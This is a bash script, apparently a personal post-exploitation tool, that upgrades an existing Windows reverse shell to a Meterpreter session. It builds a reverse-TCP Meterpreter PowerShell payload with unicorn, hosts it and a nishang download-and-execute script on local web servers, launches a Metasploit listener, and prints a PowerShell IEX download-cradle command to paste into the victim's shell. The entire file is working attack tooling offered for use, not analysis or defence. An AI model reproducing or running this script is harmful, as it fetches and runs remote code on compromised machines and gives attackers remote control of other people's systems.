#!/bin/bash
#This is a quick script that will generate a reverse meterpreter tcp powershell payload using unicorn
#and host it using apache. It will also host Download-Execute-PS.ps1 which is a powershell script
#that I grabbed from nishang toolset that downloads and executes the previously created payload
#
#At the end of the script a command will be printed to the screen
#You will need to paste this command into your existing normal reverse shell (windows/shell/reverse_tcp)
#
#
#######
#COLORS
cyan='\e[0;36m'
okegreen='\033[92m'
white='\e[1;37m'
red='\e[1;31m'

clear
echo -e $cyan""
echo -e "*"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"
echo -e "*"$white" _______ _     _ _______                                   "$cyan"*"
echo -e "*"$white" |______ |_____| |______ |      |                          "$cyan"*"
echo -e "*"$white" ______| |     | |______ |_____ |_____                     "$cyan"*"
echo -e "*                                                           *" 
echo -e "*"$white" _     _  _____   ______  ______ _______ ______  _______   "$cyan"*"
echo -e "*"$white" |     | |_____] |  ____ |_____/ |_____| |     \ |______   "$cyan"*"
echo -e "*"$white" |_____| |       |_____| |    \_ |     | |_____/ |______   "$cyan"*"
echo -e "*                                                           *"
echo -e "*"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"
echo ""
echo ""
echo ""
echo "Get Payload Options::"
echo ""
echo -e -n $white"	LHOST"$cyan"--> "
read lhost
echo -e -n $white"	LPORT"$cyan"--> "
read lport
echo ""
echo -e "["$white">"$cyan"] Creating reverse tcp meterpreter payload"
echo ""
./unicorn.py windows/meterpreter/reverse_tcp $lhost $lport > /dev/null 2>&1
mkdir /var/www/html > /dev/null 2>&1
cp powershell_attack.txt /var/www/html/powerup.txt
echo ""
echo -e "["$white">"$cyan"] Launching Metasploit Listener"
xterm -fa monaco -fs 13 -bg black -e msfconsole -r unicorn.rc &
echo ""
cd execution
echo ""
echo -e "Get Script Options::"
echo ""
echo -e -n $cyan"	"$white"LPORT"$cyan" to host script on--> "
read scriptport
echo ""
echo -e "["$white">"$cyan"] Hosting exploit script on port " $scriptport
xterm -fa monaco -fs 13 -bg black -e python -m SimpleHTTPServer $scriptport &
echo ""
echo -e "["$white">"$cyan"] Hosting upgrade payload via apache"
service apache2 restart > /dev/null 2>&1
echo ""
echo -e "["$white">"$cyan"] Please paste this into your current windows cmd session: "
echo ""
echo ""
echo -e "["$white">"$cyan"]"$red" powershell.exe "\"IEX \(new-object net.webclient\).downloadstring\("'"http://$lhost:$scriptport/Download-Execute-PS.ps1"'"\)";"Download-Execute-PS http://$lhost/powerup.txt"; ""\""$cyan"["$white"<"$cyan"]"
echo ""
echo ""
echo -e $cyan"["$white">"$cyan"] ::Script Complete::"
echo ""





